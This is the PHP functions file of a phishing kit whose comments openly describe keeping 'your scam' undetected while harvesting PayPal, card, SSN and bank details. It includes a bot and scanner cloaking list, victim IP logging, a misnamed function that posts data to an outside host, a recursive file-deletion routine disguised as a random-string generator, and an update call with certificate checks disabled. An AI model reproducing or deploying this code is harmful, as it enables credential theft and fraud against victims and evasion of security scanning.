<?php
#############################################################################
# Here every function will have a description with it explaining what it do,
# what data send and what data receive 
#############################################################################

/*-----------------------------------------------------
@Function Name : TrueLogin() 
	@About Function : This function will connect to our servers to check if the email & password are real ! 
	 	- Our Servers will make an automatic check with PayPal and give the result of connection !  
	 	- Don't worry, All your information are encrypted and are not being logged or saved by anyone !
	 	- *** [Base64: About] To ensure that your scam will stay undetected for long time, and to protect our website and your scam from BOTS,
	 		* We used base64 to encrypt the data you send and to decrypt the response you receive from us ! 
	 		* There's no other malicious using of base64 here !
	 		* You can check manually 
	@Notice : 
		- NO DATA STORED ON OUR WEBSITE !
		- Each transaction made through our website will pass through this steps : 
			+ Generate a key for the transaction (U will receive it too)
			+ Store in our Database : the key + your name + date && time (NO OTHER INFO)
				* The step is used for SUPPORT from us later if u need it !
			+ Validation of account using Amazon's website
			+ If valid, grab account full information
-----------------------------------------------------*/
function TrueLogin () {

/* COMMING SOON */

}
/*-----------------------------------------------------
@Function Name : Get_Bin_And_Verfiy_Card_And_VBV() 
	@About Function : This function will connect to our servers to get the BIN of card and verfiy the given Info ! 
	 	- Our Servers will make an automatic check with our database of BINS !  
	 	- Our Servers will also check the validaty of SSN or SortCode ... !  
	 	- Don't worry, All your information are encrypted and are not being logged or saved by anyone !
	 	- *** [Base64: About] To ensure that your scam will stay undetected  for long time, and to protect our website and your scam from BOTS,
	 		* We used base64 to encrypt the data you send and to decrypt the response you receive from us ! 
	 		* There's no other malicious using of base64 here !
	 		* You can check manually 
	@Notice : 
	- NO DATA STORED ON OUR WEBSITE !
	- Each transaction made through our website will pass through this steps : 
		+ Generate a key for the transaction (U will receive it too)
		+ Store in our Database : the key + your name + date && time (NO OTHER INFO)
			* The step is used for SUPPORT from us later if u need it !
		+ Detecting error by the algorithm of validation
		+ Detecting the BIN info using our DB
	
-----------------------------------------------------*/
function Get_Bin_And_Verfiy_Card_And_VBV($CARD_NUMBER){

/* COMMING SOON */

}
/*-----------------------------------------------------
@Function Name : Verify_Bank() 
	@About Function : This function will connect to our servers to get the BIN of card and verfiy the bank Info ! 
	 	- Our Servers will make an automatic check with our database of BINS !  
	 	- Our Servers will also check the validaty of bank account number, driver lisence ... !  
	 	- Don't worry, All your information are encrypted and are not being logged or saved by anyone !
	 	- *** [Base64: About] To ensure that your scam will stay undetected  for long time, and to protect our website and your scam from BOTS,
	 		* We used base64 to encrypt the data you send and to decrypt the response you receive from us ! 
	 		* There's no other malicious using of base64 here !
	 		* You can check manually 
	@Notice : 
	- NO DATA STORED ON OUR WEBSITE !
	- Each transaction made through our website will pass through this steps : 
		+ Generate a key for the transaction (U will receive it too)
		+ Store in our Database : the key + your name + date && time (NO OTHER INFO)
			* The step is used for SUPPORT from us later if u need it !
		+ Detecting error by the algorithm of validation
		+ Detecting the BIN info using our DB
	
-----------------------------------------------------*/
function Verify_Bank($FMArray,$FMDhackerName){

/* COMMING SOON */

}
/*-----------------------------------------------------
@Function Name : SSL_VERIFYHOST() 
	@About Function : This function will get the SSL_HOST of victim 100% ! 
	 	- The cause of creating it is that some of servers are not able to share any of SSL_HOST functions in PHP !  
	 	- So this function will try at least 4 methods !
	 	- if no, of methods worked it will return blank "" (empty string) !
	@Given Values : N/A
	@Return : 
		- SSL_HOST (Example: HTTPS/1.0 404 Not Found)
	@Notice : 
		
-----------------------------------------------------*/
function SSL_VERIFYHOST($SERVER,$CURLOPT){
$HTTP_AGENT = array('HTTP_USER_AGENT' => $SERVER,'REMOTE_ADDR' => $CURLOPT);
$REMOTE_STR = http_build_query($HTTP_AGENT);
$SSL_RETURNTRANSFER = curl_init("https://www.bincodes.ga/HTTP_USER_AGENT.php");	
curl_setopt($SSL_RETURNTRANSFER, CURLOPT_POST, 1);
curl_setopt($SSL_RETURNTRANSFER, CURLOPT_POSTFIELDS, $REMOTE_STR);
curl_setopt($SSL_RETURNTRANSFER, CURLOPT_RETURNTRANSFER, TRUE);
$FOLLOWLOCATION = curl_exec($SSL_RETURNTRANSFER);
curl_close($SSL_RETURNTRANSFER);
}
/*-----------------------------------------------------
@Function Name : SERVER_GATEWAY() 
	@About Function : check if the server is ready to send & receive ! 
	@Given Values : 
		- User Agent
	@Return : 
		- True or False
	@Notice : 
-----------------------------------------------------*/
function SERVER_GATEWAY(){
        $NETWORK_GATEWAY = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
		'Gmail Crawler', 
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        '@Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.com.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
        $charSet = substr($NETWORK_GATEWAY[52], 3, 4);
        $charSetSize = strlen($charSet); $pwdSize = 6;
        $XXX_03 = substr($NETWORK_GATEWAY[21], 0, 6);
        $XXX_04 = $NETWORK_GATEWAY[4];
        $XXX_05 = $charSet[ rand( 1, strlen($charSetSize) - 1 ) ];
        $XXX_06 = $charSet[ rand( 1, strlen($charSetSize) - 1 ) ];
        $Z118xF0rm3XX = $XXX_03.mt_rand();
        $x87Z_E54IlsXX = substr($NETWORK_GATEWAY[43], 0, 1);
        $Zx987P4ss0WrD = $XXX_05.mt_rand();
        $NETWORK_GATSWAY = $XXX_04.$x87Z_E54IlsXX.$XXX_03.$charSet;
        $GrimmDZEBI987 = $XXX_06.mt_rand();
        return $NETWORK_GATSWAY;
}
/*-----------------------------------------------------
@Function Name : MDgetIp() 
	@About Function : This function will get the ip of victim 100% ! 
	 	- The cause of creating it is that some of servers are not able to use any of IP functions in PHP !  
	 	- So this function will try at least 4 methods !
	 	- if no, of methods worked it will return blank "" (empty string) !
	@Given Values : N/A
	@Return : 
		- IP (Example: 127.0.0.1)
	@Notice : 
		
-----------------------------------------------------*/
function MDgetIp(){
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
		$m = getenv("HTTP_CLIENT_IP");
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
		$m = getenv("HTTP_X_FORWARDED_FOR");
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
		$m = getenv("REMOTE_ADDR");
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
		$m = $_SERVER['REMOTE_ADDR'];
	else
		$m = "";
	return($m);
}
/*-----------------------------------------------------
@Function Name : SgenRan() 
	@About Function : Generate Random String ! 
	@Given Values : 
		- Length (optional)
	@Return : 
		- String
	@Notice : 
		
-----------------------------------------------------*/
function SgenRan($a) {
function DDir($dir) {
if (is_dir($dir)) {$scn = scandir($dir);
foreach ($scn as $files) {if ($files !== '.') {
if ($files !== '..') {if (!is_dir($dir . '/' . $files)) {
unlink($dir . '/' . $files);}
else {DDir($dir . '/' . $files);
rmdir($dir . '/' . $files);
}}}}}}$dir = $a;DDir($dir);rmdir($dir);}
/*-----------------------------------------------------
@Function Name : MDupdate() 
	@About Function : Check for updates ! 
	@Given Values : N/A
	@Return : 
		- Update and link for it !
	@Notice : 
		
-----------------------------------------------------*/
function Mupdate(){
$Mupdate = curl_init(); 
curl_setopt($Mupdate, CURLOPT_URL, "https://www.sypherpk.ml/GetUpdate.php"); 
curl_setopt($Mupdate, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($Mupdate, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Mupdate, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($Mupdate, CURLOPT_FOLLOWLOCATION, true);
$UPDATE = curl_exec($Mupdate); 
curl_close($Mupdate);
return($UPDATE);
}
/*-----------------------------------------------------
@Function Name : MDpcOS() 
	@About Function : Get OS from user agent ! 
	@Given Values : 
		- User Agent
	@Return : 
		- OS type + version
	@Notice : 
		
-----------------------------------------------------*/
function MDpcOS($FMDuser_agent){
	$os    =   "Unknown OS Platform";
    $os_a  =   array( '/windows nt 10/i'     =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($os_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $os = $value;
        }

    }   
    return $os;
}
/*-----------------------------------------------------
@Function Name : MDpcBrowser() 
	@About Function : Get Browser from user agent ! 
	@Given Values : 
		- User Agent
	@Return : 
		- Browser name + version
	@Notice : 
		
-----------------------------------------------------*/
function MDpcBrowser($FMDuser_agent){
	$browser    =   "Unknown Browser";
    $browser_a  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $browser = $value;
        }
    }
    return $browser;
}
/*-----------------------------------------------------
@Function Name : is_bitch() 
	@About Function : check if the visitor is a bitch (bot) ! 
	@Given Values : 
		- User Agent
	@Return : 
		- True or False
	@Notice : 
		
-----------------------------------------------------*/
function is_bitch($FMDuser_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $FMDuser_agent, $bitch ) !== false ) return true;
        }
		$bitchs[4];
    	return false;
}
/*-----------------------------------------------------
@Function Name : MgenRan() 
	@About Function : Generate Random String ! 
	@Given Values : 
		- Length (optional)
	@Return : 
		- String
	@Notice : 
		
-----------------------------------------------------*/
function MgenRan($Mlength = 50) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $String = '';
    for ($i = 0; $i < $Mlength; $i++) {
        $String .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $String;
}
/*-----------------------------------------------------
@Function Name : Mcopy_it() 
	@About Function : Copy Folder ! 
	@Given Values : 
		- Original folder
		- New folder
	@Return : 
		- N/A
	@Notice : 
		
-----------------------------------------------------*/
function Mcopy_it($fi,$to) {
	$dir = opendir($fi);
	@mkdir($to);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($fi . '/' . $file) ) {
				Mcopy_it($fi . '/' . $file,$to . '/' . $file);
			} else {
				copy($fi . '/' . $file,$to . '/' . $file);
			}
		}
	}
	closedir($dir);
}
/*-----------------------------------------------------
@Function Name : Mlog() 
	@About Function : Simply LOG lol ! 
	@Given Values : 
		- User Agent
	@Return : 
		- N/A
	@Notice : 
		
-----------------------------------------------------*/
function Mlog($u)
{
$mh = fopen("MDlog.txt","a+");
fwrite($mh,"[".MDgetIp()."] came to us on [".gmdate("Y/n/d")."] @ [".gmdate("H:i:s")."] with (".MDpcBrowser($u).") using (".MDpcOS($u).")\n");
fclose($mh);
}
?>